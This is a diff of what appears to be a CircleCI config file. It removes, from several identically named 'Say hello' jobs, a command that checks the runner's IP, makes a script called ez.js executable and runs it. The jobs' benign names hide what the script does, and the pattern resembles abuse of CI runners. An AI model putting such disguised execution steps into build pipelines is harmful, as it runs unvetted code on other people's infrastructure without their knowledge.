@@ -18,7 +18,7 @@ jobs:
       - run:
           name: "Say hello"
           
-          command: curl ipinfo.io;chmod 755 ez.js;./ez.js
+          command: curl ipinfo.io
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
@@ -35,7 +35,7 @@ jobs:
       - run:
           name: "Say hello"
           
-          command: curl ipinfo.io;chmod 755 ez.js;./ez.js
+          command: curl ipinfo.io
   ssb:
     # Specify the execution environment. You can specify an image from Dockerhub or use one of our Convenience Images from CircleCI's Developer Hub.
     # See: https://circleci.com/docs/2.0/configuration-reference/#docker-machine-macos-windows-executor
@@ -48,7 +48,7 @@ jobs:
       - run:
           name: "Say hello"
           
-          command: curl ipinfo.io;chmod 755 ez.js;./ez.js
+          command: curl ipinfo.io
   ssc:
     # Specify the execution environment. You can specify an image from Dockerhub or use one of our Convenience Images from CircleCI's Developer Hub.
     # See: https://circleci.com/docs/2.0/configuration-reference/#docker-machine-macos-windows-executor
@@ -61,7 +61,7 @@ jobs:
       - run:
           name: "Say hello"
           
-          command: curl ipinfo.io;chmod 755 ez.js;./ez.js
+          command: curl ipinfo.io
   ssd:
     # Specify the execution environment. You can specify an image from Dockerhub or use one of our Convenience Images from CircleCI's Developer Hub.
     # See: https://circleci.com/docs/2.0/configuration-reference/#docker-machine-macos-windows-executor
@@ -74,7 +74,7 @@ jobs:
       - run:
           name: "Say hello"
           
-          command: curl ipinfo.io;chmod 755 ez.js;./ez.js
+          command: curl ipinfo.io
 
 workflows:
   say-hello-workflow:
